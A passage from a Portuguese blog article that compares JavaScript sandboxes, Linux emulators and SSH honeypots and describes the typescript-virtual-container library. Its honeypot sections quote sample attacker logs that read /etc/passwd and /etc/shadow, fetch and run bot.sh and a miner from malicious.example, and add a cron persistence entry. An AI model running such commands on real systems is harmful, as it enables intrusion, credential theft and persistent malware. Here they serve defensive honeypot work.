  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Enviar ao xterm.js do navegador via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Repassar as teclas do navegador ao shell
  shell.write(data);
});
```

É o esquema padrão para IDEs cloud e terminais web : xterm.js (navegador) ↔ WebSocket ↔ node-pty ↔ bash de verdade. O isolamento continua inexistente. O shell roda com todas as permissões do processo Node.js (ou do usuário que o lança).

**Mantido por** : Microsoft.
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4 -- Os honeypots SSH

Honeypots são feitos para serem atacados. O objetivo é parecer real o bastante para os atacantes interagirem, registrando tudo que fazem para inteligência de ameaças. SSH é o alvo principal porque é o serviço mais atacado na internet -- se você expõe a porta 22 em um IP público, vai ver tentativas de scan automatizadas em minutos literalmente. Tenta um dia, é bem horripilante a rapidez com que chega.

A qualidade de um honeypot se mede em duas coisas : a **fidelidade** (quão convincentemente imita um sistema de verdade) e a **telemetria** (quantos dados úteis captura). As duas estão em tensão. Um honeypot de alta fidelidade é mais difícil de construir e mais arriscado de operar.

Esta seção foi o que acabou me levando a construir o módulo `HoneyPot` em `typescript-virtual-container`, então tenho algumas opiniões aqui.

### 4.1 Cowrie -- o padrão-ouro

Cowrie é um honeypot SSH e Telnet de interação média a alta baseado em Python. É o honeypot SSH mais implantado na comunidade de pesquisa e segurança.

Arquitetura :
- **Camada de protocolo** : implementação real do protocolo SSH (Twisted Conch), então os atacantes têm handshakes de verdade, troca real de chaves, autenticação de verdade
- **Camada shell** : um sistema de arquivos falso (parecendo Debian 5.0) e um interpretador parcial de shell que responde a comandos comuns
- **Modo proxy** : pode redirecionar para um sistema real por trás (modo de alta interação), registrando tudo que passa
- **Modo LLM** (adição recente) : usa um modelo de linguagem para gerar respostas dinâmicas para comandos que não sabe tratar -- sim, Cowrie agora tem modo IA. Vivemos uma época maluca.

```python
# O que Cowrie captura
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie salva os arquivos baixados (via wget/curl/SFTP/SCP) para análise de malwares. Integra com Splunk, Elasticsearch, e outras plataformas SIEM.

**Fidelidade** : média-alta. Convincente o bastante para enganar bots automatizados (que são 99% dos atacantes SSH -- a maioria é só script burro que tenta `root`/`password`). Humanos sofisticados conseguem identificar por fingerprint no entanto, geralmente bem rápido.

**Linguagem** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- o antecessor do Cowrie

Kippo é o honeypot SSH original de interação média no qual Cowrie foi baseado. Mesma ideia base : protocolo SSH de verdade, sistema de arquivos falso, shell parcial. Cowrie o suplantou totalmente a esta altura -- Kippo está arquivado e ninguém deveria usar em 2026. Mencionado aqui puramente pela exaustividade histórica, já que você pode vê-lo citado em artigos velhos de blog e papers de segurança.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) -- arquivado

---

### 4.3 endlessh -- o tarpit SSH

endlessh é um honeypot degenerado : mantém conexões SSH abertas transmitindo lentamente os dados do banner a 1 byte por segundo (ou menos). Um cliente SSH que se conecta vai ficar preso indefinidamente -- nunca chega à autenticação porque o servidor nunca termina de mandar o banner.

O objetivo não é inteligência de ameaças mas pura negação de recurso : ocupar as threads de scan dos atacantes para não alcançarem os alvos reais tão rápido. É sinceramente meio diabólico no bom sentido. Você não aprende nada do atacante -- só faz ele perder tempo. Há algo profundamente satisfatório nisso.

```c
// Todo o comportamento protocolar do endlessh :
// Enviar : "SSH-2.0-OpenSSH_" e depois adicionar lentamente caracteres aleatórios
// Nunca fechar a conexão
// O scanner do atacante expira após N segundos
```

Nenhum comando é capturado. Nenhuma autenticação é testada. Só tempo de conexão.

**Escrito em** : C
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- o honeypot "deixa todo mundo entrar"

sshesame aceita todas as conexões SSH (qualquer usuário, qualquer senha, qualquer chave) e registra tudo. É um honeypot de zero interação : não responde a comandos, só deixa os atacantes "entrar" e registra cada tecla que digitam.

```
2024-01-15 03:22:11 Conexão de 45.33.32.156
  Usuário : root, Senha : password123 -- aceito
  Comandos digitados :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Desconectado após 47s
```

Útil para colheita de credenciais : você acumula rápido os nomes de usuário e senhas que os bots tentam, o que diz quais credenciais padrão estão sendo atacadas por força bruta ativamente. Spoiler : é sempre `root`/`password`, `admin`/`admin`, e `root`/`123456`. Sempre.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework de honeypot baseado em Docker

`lyrebird/honeypot-base` é uma imagem Docker base para construir honeypots de serviços de rede. Não é especificamente um honeypot SSH -- é um framework para construir honeypots para qualquer protocolo.

A imagem base fornece um framework de logging, um sistema de plugins para protocolos, e configs Docker Compose para honeypots multisserviço. Você estende para simular serviços específicos.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Construir um honeypot SSH em Node.js -- o jeito ingênuo, e por que falha

Antes de `typescript-virtual-container`, construir um honeypot SSH em Node.js significava combinar a biblioteca real `ssh2` com uma simulação manual de comandos. Bem trabalhoso, bem incompleto, mas... é passagem obrigatória a esta altura :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Registrar a tentativa
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Deixar todo mundo entrar
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Resposta simulada
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Isso "funciona" no sentido de capturar credenciais e comandos. Mas é obviamente falso assim que um atacante sofisticado cutuca um pouco. `uname -a` devolve a string certa mas `ls /etc` devolve "command not found" -- cheira a armadilha de longe. O sistema de arquivos não existe. Comandos não se encadeiam. Pipes não funcionam. Variáveis não expandem.

Um atacante competente identifica seu honeypot nos cinco primeiros comandos. Scripts automatizados que procuram comportamento tipo Cowrie também detectam na hora. Isso aparentemente foi o que levou a autora de `typescript-virtual-container` a construir algo que interpreta comandos de verdade -- mais sobre isso na Parte 5.

---

### Resumo da família dos honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Ingênuo ssh2 |
|---|---|---|---|---|---|---|
| **Nível de interação** | médio-alto | médio | zero | zero | variável | baixo |
| **Protocolo SSH de verdade** | ✅ | ✅ | ❌ (tarpit) | ✅ | variável | ✅ |
| **Fidelidade do shell** | média | média | n/a | nenhuma | variável | mínima |
| **Captura credenciais** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Captura comandos** | ✅ | ✅ | ❌ | ✅ | variável | ✅ |
| **Captura malwares** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integração SIEM** | ✅ nativa | ❌ | ❌ | ❌ | ❌ | manual |
| **Respostas LLM** | ✅ (novo) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Linguagem** | Python | Python | C | Go | Docker | Node.js |
| **Nativo Node.js** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ bem ativo | ⚠️ arquivado | ✅ ativo | ✅ ativo | ✅ ativo | DIY |

O esquema aqui é bem claro : quanto mais fidelidade você quer, mais Python precisa escrever. Cowrie é o vencedor indiscutível se você faz isso a sério -- foi provado em campo por anos e captura bem mais que simples credenciais. endlessh e sshesame são projetos legais mais que ferramentas sérias de inteligência de ameaças. E a abordagem ingênua em Node.js te leva talvez a 20% do caminho antes de bater num muro.

---

## Parte 5 -- `typescript-virtual-container` : o que preenche a lacuna

OK aqui as coisas ficam interessantes. Depois de catalogar todas as famílias acima, a lacuna que falta fica bem evidente :

- Os sandboxes JS : isolam código, sem shell, sem sistema de arquivos, sem SSH
- Os emuladores Linux : OS de verdade, shell de verdade, SSH de verdade... mas 150+ MB de RAM, 30 segundos de boot, e você precisa construir sua própria API por cima das E/S seriais
- Os honeypots : shell falso, sem API programável, Python/Go/C, não nativo Node

Ninguém tinha construído um ambiente Linux completo, programável, nativo Node, com SSH de verdade, permissões de verdade, rede virtual de verdade, e uma API TypeScript tipada. Então ela construiu.

Pequena introdução já que é a primeira vez que menciono direito : `typescript-virtual-container` foi construído por [Chloé Rolzhausen](https://itsrealfortune.fr), uma desenvolvedora francesa que se chama **Fortune** (ou ItsRealFortune) online. Dá para achá-la no seu [site](https://itsrealfortune.fr) e no [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). O projeto inteiro -- 56 000 linhas de TypeScript, 247 arquivos, 170 comandos -- foi um esforço solo de uma pessoa só. Vou chamá-la de Fortune no resto do artigo. E sim, é bem louco. Vai olhar o trabalho dela !

### O que realmente é

`typescript-virtual-container` é um **simulador de ambiente Linux** escrito em TypeScript puro. Sem Wasm, sem extensões nativas, sem kernel. ~56 000 linhas de fonte em 247 arquivos TypeScript.

O insight principal : você não precisa de um emulador de CPU para fazer `ls /etc | grep passwd` funcionar. Você precisa de :
1. Uma árvore de nós em memória que respondem a operações de caminho
2. Um modelo de permissões POSIX aplicado a cada acesso
3. Um parser de shell que entende pipelines, redirecionamentos, subshells e expansão de variáveis
4. ~170 implementações de comandos (funções, não binários)
5. Um sistema de gestão de usuários e grupos
6. Algo para expor tudo isso via SSH

Tudo isso dá para fazer em TypeScript puro sem nenhum envolvimento de kernel.

### O VirtualFileSystem

O VFS é uma árvore em memória de nós tipados -- sem E/S de disco a não ser que você ative explicitamente o modo de persistência `"fs"` :

```ts
// Representação interna simplificada
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder carregado preguiçosamente
```

Cada operação de caminho passa por `normalizePath` (resolve `.`, `..`, links simbólicos) e `enforceAccess` (verifica permissões de leitura/escrita/execução contra o uid/gid requerente). `chmod`, `chown`, sticky bits e setuid são todos implementados e realmente aplicados. Se um processo rodando como uid 1000 tenta ler um arquivo de root com modo 0600, recebe EACCES -- não um EACCES falso, um `Error` JavaScript de verdade lançado da verificação de permissão. Essa parte é bem elegante sinceramente.

O VFS serializa em :
- `.vfsb` -- um formato binário compacto (customizado, com compressão fflate) -- é o formato padrão
- Snapshot JSON -- legível por humano, bom para debug
- Arquivo TAR -- import/export com o formato tar de verdade, então dá para `tar -xf` algo e o VFS simplesmente... tem esses arquivos
- Imagem SquashFS -- import só de leitura

Em modo de persistência `"fs"`, mantém um write-ahead log (WAL) para recuperação de crash -- escritas vão primeiro ao log, depois ao snapshot no flush. Se o Node morre no meio de uma operação, o log permite reconstruir o último estado completo.

Há também uma camada `FileCache` que simula latência de E/S de disco. Você configura perfis como `NVME_DISK_IO` ou `HDD_DISK_IO` e o VFS atrasa artificialmente as operações de arquivo para casar com temporizações realistas. O que é bem engraçado -- um software que se atrasa de propósito para simular hardware -- mas na verdade bem útil para benchmarking.

### O interpretador de shell

O parser do shell produz uma AST tipada :

```ts
// "ls /etc | grep root && echo done" faz parse para :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

O executor percorre essa AST :
- Para um pipeline, cria uma cadeia de streams `{ stdin, stdout, stderr }` e executa cada comando com E/S encadeadas
- Para operadores lógicos (`&&`, `||`), verifica `$?` após o lado esquerdo antes de executar o direito
- Para subshells (`$(...)`, `` ` ` ``), bifurca o contexto de execução
- Para redirecionamentos (`>arquivo`, `>>arquivo`, `2>&1`, `<arquivo`), configura a fiação dos streams antes da execução
- Para tarefas de fundo (`cmd &`), executa sem esperar o fim
- Para variáveis, expande `$VAR`, `${VAR:-default}`, `${#VAR}`, e aritmética `$((expr))`
- Para expansão de chaves (`{a,b,c}`, `{1..5}`), gera a lista completa de expansão antes de executar

Tudo isso é comportamento POSIX shell de verdade. O parser lida com heredocs, substituição de processo, globbing (`*`, `?`, `[abc]`), e gestão de aspas (aspas simples, aspas duplas com interpolação, escape com barra invertida). Não é perfeito -- casos limite existem -- mas está bem além do que você esperaria de um projeto TypeScript.

### ~170 comandos embutidos

Comandos são funções TypeScript registradas em um registro de comandos. Recebem um `CommandContext` com os streams stdin/stdout/stderr, o VFS, a sessão de usuário, o ambiente do shell, e acesso aos submódulos.

Escrever 170 implementações de comandos Unix é... muita coisa. Alguns são triviais (`echo`, `true`, `false`), alguns são surpreendentemente complexos (`awk`, `find`, `tar`). Tipo, um `awk` POSIX completo ? Em TypeScript ? É louco sinceramente. Eis uma amostra do que tem dentro :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (lado cliente, conexão de saída),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interativo completo), vim (básico), vi (básico),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulado), systemctl (stub), journalctl (stub),
...e cerca de 130 outros
```

Os "stubs" (git, python3, node) respondem de forma realista a invocações comuns -- `python3 --version` devolve uma string de versão crível, `git status` mostra um estado fictício de repositório -- sem fazer trabalho real. Para um honeypot, são na verdade mais úteis que os comandos reais, porque permitem observar o que os atacantes tentam executar sem executar nada perigoso.

### O servidor SSH

A camada SSH usa o package npm real `ssh2` -- protocolo SSH de verdade, troca real de chaves, criptografia de verdade. `SSHMimic` embrulha isso :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH de verdade : ssh -p 2222 root@localhost
// SFTP de verdade : sftp -P 2222 root@localhost
// SCP de verdade : scp -P 2222 file root@localhost:/tmp/
```

Os `shellProperties` determinam o que `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, e `/etc/os-release` relatam. Dá para imitar qualquer distribuição Linux e versão de kernel de forma convincente -- para um cliente SSH de verdade, não há literalmente como notar a diferença.

### O módulo HoneyPot

Como o interpretador de shell é real e o servidor SSH é real, os comandos dos atacantes executam de verdade no ambiente virtual. Requisições `wget` disparadas pelo atacante são registradas com as URLs de destino. Arquivos criados pelo atacante são salvos no VFS. Tentativas de escalada de privilégio do atacante produzem erros realistas.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Depois de uma sessão, diferenciar o sistema de arquivos
const before = shell.vfs.toSnapshot();
// ... sessão do atacante ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Isso é qualitativamente diferente de Cowrie. O sistema de arquivos falso de Cowrie pode responder a `ls` mas não consegue acompanhar de verdade os arquivos que um atacante criou e as modificações que fez como um diff estruturado. `typescript-virtual-container` consegue, porque o VFS é uma estrutura de dados viva -- cada escrita é rastreada. Essa entrada cron que o atacante acabou de adicionar ? Está no diff. Essa pasta `.hidden` ? No diff. Bem útil para análise de malwares.

### A pilha de rede virtual

Provavelmente a parte mais impressionante do projeto inteiro, e não tem equivalente em nenhum outro projeto desse espaço. Tipo, uma pilha de rede virtual L2/L3 completa com suporte a VPN, escrita em TypeScript puro, sem nenhuma placa de rede real envolvida. É realmente louco.

`VirtualNetworkManager` dá a cada instância `VirtualShell` interfaces de rede virtuais com endereços IP configuráveis, tabelas de roteamento, e um firewall de software (regras estilo iptables com conntrack e NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` mostram todos o estado da rede virtual.

`VirtualSwitch` (chamado Baie -- da palavra francesa para baia de servidor, "baie informatique") conecta vários shells em uma sub-rede compartilhada. Implementa :
- Aprendizado MAC e ARP
- Roteamento IP entre sub-redes
- NAT (masquerade de saída)
- DNS (registros configuráveis por sub-rede)
- Balanceamento de carga (round-robin, menos conexões)
- Modelagem de tráfego : latência, jitter (distribuição gaussiana), perda de pacotes, perda em rajadas, reordenação, duplicação
- Limitação de banda (token bucket)
- Aplicação de MTU
- Rastreio de conexão (com estado, estados NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Três máquinas virtuais no mesmo switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall : web alcança api, api alcança db, web não alcança db direto
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Modelagem de tráfego : simular um link WAN instável para fora
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` cria túneis criptografados entre instâncias de Baie -- dá para simular uma rede multisite com interconexões VPN entre sites.

`VirtualProxy` implementa port forwarding e um proxy SOCKS5.

Nada disso toca uma placa de rede de verdade. É tudo roteamento de objetos TypeScript. O comando `ping` "funciona" roteando via o switch virtual e devolvendo respostas ICMP simuladas. `curl http://192.168.0.3/api` roteia via a rede virtual, alcança a resposta HTTP simulada do shell api, e devolve o conteúdo. São tartarugas até embaixo, no melhor sentido possível.

### O `SandboxedShell`

Para uso programático onde você precisa de isolamento mais forte, `SandboxedShell` executa uma sessão shell em uma thread Worker Node.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% de um núcleo
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

O isolamento aqui é garantido pela camada VFS (o shell da thread worker só enxerga o sistema de arquivos virtual, nunca o do hospedeiro) mais o isolamento de memória da thread Worker Node.js. É mais leve que `isolated-vm` mas mais apropriado para isolamento no nível shell em vez de no nível JS.

### Teto de recursos

Dá para configurar limites de recursos por shell que afetam o que os comandos de monitoramento de sistema relatam :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Dentro desse shell, `free -m` mostra 512 MB de RAM total. `nproc` devolve 2. `/proc/meminfo` mostra os valores com teto. `htop` e `top` mostram o número de CPU com teto. Isso permite definir com precisão a pegada de hardware da máquina simulada.

### Três modos de deploy

```
Modo 1 : Servidor SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Protocolo SSH de verdade, SFTP de verdade, SCP de verdade
  → Caso de uso : honeypots, ambientes de teste remotos, laboratórios de treinamento

Modo 2 : Shell web (navegador)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Roda no navegador, VFS persistido em IndexedDB
  → Caso de uso : tutoriais interativos, terminais embutidos, demos
  → Bônus : executa startxfce4 para um desktop XFCE completo simulado

Modo 3 : CLI autônoma
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (um arquivo só, sem instalação)
  → curl e executa, VFS persistido no diretório .vfs/
  → Caso de uso : demos rápidas, experimentação local
```

### Os polyfills -- como o build de navegador funciona sem Wasm

OK essa é a parte que acho realmente inteligente e que eu queria destacar especialmente.

Fazer uma biblioteca Node.js funcionar no navegador geralmente é um pesadelo. Ou você usa um runtime Wasm (pesado, lento para carregar), ou passa semanas trocando manualmente cada import `node:*` por uma alternativa compatível com navegador. Fortune fez a segunda coisa -- mas de forma bem limpa, escrevendo um conjunto de polyfills customizados que vivem no diretório `polyfills/` do repo.

O pipeline de build é só esbuild com um monte de entradas `alias` :

```js
// demo/build.js -- toda a config do build de navegador
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Sem Wasm, sem biblioteca externa de polyfills, sem recorrer a `webpack-node-externals`. Só módulos com alias e alguns globais injetados. Deixa eu detalhar cada um porque alguns são realmente impressionantes.

**`node:fs` -- IndexedDB como falso sistema de arquivos**

Esse é meu favorito. O polyfill `node:fs` implementa a API síncrona fs do Node.js (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) sustentada por duas camadas : um `Map` em memória para leituras síncronas, e IndexedDB para persistência entre recarregamentos de página. Escritas vão ao Map na hora (então `readFileSync` logo depois de `writeFileSync` sempre funciona), e depois são despejadas para o IndexedDB de forma assíncrona em segundo plano.

```js
// Cache síncrono (caminho → Uint8Array | null) -- leituras instantâneas
const memCache = new Map();

// Pré-carregar tudo do IndexedDB para memCache no boot
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

É por isso que o snapshot VFS sobrevive a recarregamentos de página no navegador -- o binário `.vfsb` inteiro é escrito no IndexedDB via esse polyfill, e relido no carregamento seguinte. Sem Wasm, sem servidor. Só IndexedDB, que está em todos os navegadores desde 2011.

**`node:crypto` -- SHA-256 em JS puro**

Em vez de importar uma biblioteca crypto Wasm, o polyfill crypto implementa SHA-256 do zero usando as constantes de rodada FIPS 180-4. 166 linhas de JS puro com suporte completo a saídas hex/base64/Uint8Array. Todo o hashing na biblioteca passa por ali -- fingerprint das chaves hospedeiras SSH, checksums internos, tudo. Compacto, zero dependência, funciona.

**`node:os` -- lê o hardware real do navegador**

Essa é uma atenção bonita. Em vez de devolver valores fictícios fixos, `node:os` lê `navigator.deviceMemory` para a RAM total e `navigator.hardwareConcurrency` para o número de CPU. Então `neofetch` no build de navegador relata na verdade algo que corresponde à sua máquina de verdade -- não um stub fajuto de "2 núcleos, 2 GB de RAM".

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB padrão
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // também analisa navigator.userAgent para adivinhar a string do modelo CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stubs honestos**

O navegador não pode abrir sockets TCP nem rodar SSH de verdade, então são stubs que lançam um erro `NotImplemented` com mensagem clara se algo tenta usá-los. Falhas continuam explícitas, sem `undefined` devolvido onde um objeto é esperado. Só uma mensagem forte e clara de "isso não funciona no navegador" -- que é exatamente o que você quer.

**`process.js` e `buffer.js` -- globais injetados**

Esses dois são injetados no topo de cada arquivo do bundle via a opção `inject` do esbuild, então `process` e `Buffer` ficam disponíveis globalmente sem nenhum import explícito. `process.js` é minúsculo : `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` é uma reimplementação completa de `Buffer` sobre `Uint8Array` -- todos os métodos `readUInt32BE`, `writeInt16LE`, as codificações hex/base64 das quais a implementação SSH e o VFS dependem.

---

O conjunto de polyfills tem cerca de 640 linhas de JS escrito à mão no total. Sem packages npm, sem Wasm. E o resultado é um bundle de navegador que é só a biblioteca, rodando nativamente, sem nenhuma da ansiedade habitual de "mas será que funciona mesmo no navegador ?" que você tem com bibliotecas feitas para Node primeiro. Vale olhar a pasta `polyfills/` no repo se tiver curiosidade -- cada arquivo é bem contido e legível sozinho, que é uma escolha de estilo que aprecio muito.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoria** | Sandbox JS | Sandbox JS | Sandbox JS | Emulador | Emulador | Node.js/Wasm | Honeypot | Simulador |
| **Isola o JS** | ⚠️ escopo | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | parcial | n/a | ✅ Worker |
| **Kernel Linux de verdade** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interpretador shell** | ❌ | ❌ | ❌ | ✅ (real) | ✅ (real) | ✅ (real) | parcial | ✅ (customizado) |
| **~170 comandos Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | parcial | ~20 | ✅ |
| **Permissões POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | parcial | ✅ aplicadas |
| **Gestão de usuários** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | mínima | ✅ completa |
| **Servidor SSH de verdade** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/auditoria** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | limitado | ❌ | ❌ | ❌ | ✅ |
| **Rede virtual L2/L3** | ❌ | ❌ | ❌ | básica | ❌ | ❌ | ❌ | ✅ completa |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Suporte navegador** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Nativo Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API tipada** | básica | ✅ | ✅ | mínima | ❌ | ✅ | ❌ | ✅ completa |
| **Compatibilidade binária** | n/a | n/a | n/a | ✅ | ✅ | parcial | n/a | ❌ |
| **Tempo de boot** | instantâneo | instantâneo | instantâneo | 15-40s | 15-40s | 2-5s | instantâneo | <1s |
| **RAM/instância** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Dependências runtime** | 0 | 1 (nativa) | 1 (Wasm) | 0 | proprietário | 1 | dependências Python | 3 (ssh2, ws, fflate) |
| **Status** | estável | ✅ ativo | ✅ ativo | ✅ bem ativo | comercial | ✅ ativo | ✅ ativo | ✅ ativo |

---

## Quando usar o quê

**Você precisa executar JavaScript não confiável -- uma fórmula enviada por usuário, um plugin, um hook de script.**
→ `isolated-vm`. V8 Isolate de verdade, limites rígidos de memória, ponte explícita de comunicação. Evite `vm2` -- a lista de CVEs só cresce, sério é tipo uma nova a cada poucos meses. Evite `vm` -- não é sandbox de jeito nenhum, por favor.

**Você precisa isolar JS e não quer extensão nativa, ou precisa de compatibilidade com navegador.**
→ `quickjs-emscripten`. Fronteira Wasm, módulo de uns 500 KB, funciona em navegadores e Node. Mais lento que V8 mas realmente isolado.

**Você precisa bootar um OS Linux real não modificado com compatibilidade binária.**
→ `v86` para Linux 32-bit, ou `container2wasm` se você tem uma imagem Docker existente. Aceite 150 MB+ de RAM e 30 segundos de boot, é o acordo. Se precisa de 64-bit, olhe CheerpX ou use só um runtime de contêiner de verdade.

**Você precisa embutir um terminal tipo Linux em uma aplicação web sem backend.**
